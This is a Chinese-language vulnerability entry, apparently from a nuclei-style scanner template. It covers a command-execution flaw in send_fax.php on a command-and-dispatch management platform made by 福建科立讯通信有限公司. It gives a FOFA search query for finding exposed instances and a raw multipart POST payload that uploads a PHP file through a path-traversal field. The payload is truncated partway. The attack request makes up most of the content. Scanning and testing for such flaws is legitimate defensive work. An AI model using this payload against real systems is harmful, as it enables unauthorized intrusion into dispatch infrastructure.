# 福建科立讯通信有限公司指挥调度send_fax.php存在命令执行漏洞

- **系统**：福建科立讯通信有限公司指挥调度　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`POST /custom/zx/fax/send\_fax.php HTTP/1.1`
- **关键头**：`id: zhihuidiaodu-send\_fax-rce`　`name: zhihuidiaodu-send\_fax-rce`　`author: unknow`　`severity: critical`　`tags: zhihuidiaodu,rce`　`fofa-query: app="指挥调度管理平台"`　`verified: true`　`max-request: 2`

**请求体 / payload**
```
- raw:
-
Host:
Content-Length: 666
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="sendfile";filename="whoami.php";
Content-Type: text/plain
11111111111111111111
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="fax\_extention"
../../../../../..
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="fax\_caller\_id\_name"
file
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="fax\_caller\_id\_number"
…（脚本共 954 字，完整版见原文）
```
- **预期**：200　|　—